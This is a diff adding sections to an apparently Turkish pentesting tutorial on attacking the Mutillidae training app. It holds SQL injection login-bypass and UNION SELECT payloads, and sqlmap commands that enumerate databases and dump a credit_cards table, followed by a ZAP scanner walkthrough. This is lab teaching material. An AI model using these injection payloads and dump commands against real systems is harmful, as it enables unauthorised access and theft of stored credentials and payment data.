@@ -974,4 +974,47 @@ Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```
 ### SQL Get ile Admin Bilgilerini Öğrenme
 
 1.```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, username, password, is_admin,5 from account%23&password=123456&user-info-php-submit-button=View+Account+Details```
+
 2. Admin kullanıcı adlarını ve şifrelerini görürüz
+
+# SQL Map 
+
+```URL``` adresini verdiğimiz sitede SQL açığı var mı test eder
+
+1.``` sqlmap -u "http://123.123.123.123/mutillidae/index.php?&username=admin&password=123123&user-info-php-submit-button=View+Account+Details"```
+2. Bize eğer ```Get parameter 'username' is vulnerable. Do you want to keep testing the others (if any) Y/N``` derse "açık bulundu teste devam edeyim mi?" diye soruyordur
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/bf3a19821795b78ca5fed16e82ad334859214ecc/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2017.40.21.jpeg)
+
+3. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --current-db``` Güncel database'leri verir
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/c5a212ed129be0d8418261b677042d9c5e504e6d/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2017.47.09.jpeg)
+
+4. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --tables -D owasp10``` owasp10 içindeki tüm table'lları gösterir
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/83e78aeb040296afd4cb7b83cab56a7ddc988b92/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.29.34.jpeg)
+
+5. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --columns -T <tableismi> -D <databaseismi>``` Sütunları görmemizi sağlar
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/e2b4b92b35c22b60c442741dfc83a30892a2ae9f/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.32.11.jpeg)
+
+6. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" -T credit_cards -D owasp10 --dump``` Table içindeki verileri gösterir
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/d326716448fe5caa031175c9d6ac65a8dc08b1fb/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.34.27.jpeg)
+
+# ZAP Bir Çeşit Açık Bulma Programı 
+#### 1. Zap uygulamasını açıyoruz
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/zap.jpeg)
+#### 2. ```Scan Policy Manager``` kısımından ```XSS'mi yoksa SQL'mi``` seçebiliriz
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/scan%20policy.jpeg)
+#### 3. Sitenin URL'sini yapıştırıp ```active scan'i ekliyoruz (sol altta bulunan yeşil artıdan)``` ve attack diyoruz
+#### 4. ```Alert``` kısımından açık türlerini görebiliriz
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/alerts.jpeg)
+#### 5. Açığa tıklayıp ```response``` seçersek o açığı ele geçirmek için gerekli teknik bilgileri görebiliriz
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/response.jpeg)
+#### 6. ```Alert``` kısımındaki açığa sağ tıklayarak o sayfaya gidebiliriz
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/open%20url.jpeg)
+#### 7. ```Kırmızı bayrak``` yüksek riskli, ```Sarı bayrak``` düşük riskli demektir
+
+
+
